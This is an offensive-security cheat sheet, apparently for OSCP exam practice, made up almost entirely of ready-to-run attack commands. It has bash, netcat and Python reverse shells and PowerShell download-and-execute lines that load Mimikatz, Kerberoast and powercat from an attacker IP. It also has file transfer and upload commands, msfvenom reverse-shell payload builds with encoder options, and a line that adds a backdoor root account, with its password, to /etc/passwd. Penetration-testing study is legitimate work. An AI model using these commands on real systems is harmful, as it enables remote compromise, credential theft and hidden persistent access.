# O.S.C.P-cheat-sheet

## Program first line execution
```
#!/bin/bash
#!/usr/bin/python
```

## GUI smb/ftp folder
```
xdg-open smb://
xdg-open ftp://
```

## Find something
Linux
```
grep -R password .                                  (find word inside files)
find . -iname flag                                  (find file name)
find . -type f -name "*.php"                        (find file type/extension)
```
Windows
```
findstr /spin "password" *.*                        (find word inside files)
dir /s *flag*                                       (find file name)
findstr /si password *.xml *.ini *.txt *.config     (find word inside files type/extension)
```

## Python http server
```
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

## Python tty spawn
```
python -c 'import pty; pty.spawn("/bin/bash")'
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Linux transfer file methods
Download
```
wget http://192.168.119.243:80/linpeas.sh
curl http://192.168.119.243:80/linpeas.sh -o linpeas.sh
ftp offsec:offsec
```
Upload
```
scp flag.txt kali@192.168.119.243:/home/kali
ftp offsec:offsec
```

## Windows transfer file methods
Download
```
powershell.exe -ExecutionPolicy Bypass "Start-BitsTransfer -Source 'http://192.168.119.243:80/winPEASx64.exe'" -Destination C:\
powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest -URI 'http://192.168.119.243:80/winPEASx64.exe'" -OutFile C:\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.243:80/winPEASx64.exe', 'winPEASx64.exe')
certutil.exe -urlcache -f http://192.168.119.243:80/winPEASx64.exe winPEASx64.exe
wget http://192.168.119.243:80/winPEASx64.exe
curl http://192.168.119.243:80/winPEASx64.exe
bitsadmin /transfer pwn /download http://192.168.119.243:80/winPEASx64.exe
```
Direct execution from Powershell
```
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/powercat.ps1');powercat -c 192.168.119.243 -p 443 -e cmd"
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/PowerUp.ps1');Invoke-AllChecks"
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"kerberos::list /export"'"
powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
```
Upload
```
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.243/uploads.php', 'system')             (need start apache2)
pscp.exe flag.txt kali@192.168.119.243:/home/kali
ftp offsec:offsec
```
SMB server (download&upload)
```
kali: impacket-smbserver lolll . 
victim: net use * \\192.168.119.243\lolll

copy Z:\nc64.exe
xcopy Z:\Recon /E                                           (recursive)
Z:\nc64.exe -nc 192.168.119.243 443 -e cmd.exe              (direct execution)
```

## Reverse shell
### One liner
Linux
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.243 443 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.243",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
bash -i >& /dev/tcp/192.168.119.243/443 0>&1
/bin/bash -l > /dev/tcp/192.168.119.243/443 0<&1 2>&1
nc -nv 192.168.119.243 443 -e /bin/bash
```
Windows
```
powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/powercat.ps1');powercat -c 192.168.119.243 -p 443 -e cmd"
nc64.exe -nv 192.168.119.243 443 -e cmd.exe
Z:\nc64.exe -nv 192.168.119.243 443 -e cmd.exe
```
### Files
Msfvenom
```
Stageless
32bit:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
64bit:
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe

Staged
32bit:
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
64bit:
msfvenom -a x64 --platform Windows -p windows/x64/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe

add followings if needed:
EXITFUNC=thread, -b "\x00\x0a\x0d\x25\x26\x2b\x3d", –e x86/shikata_ga_nai, -i 20
```
Other files/webshell
```
msfvenom -f asp -f elf -f c -f raw -f js_le -f hta-psh -f war 
locate webshell to list webshell
common used: php-reverse-shell.php
```

## Root user to add in /etc/passwd
```
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash        (root2:mrcake)
```






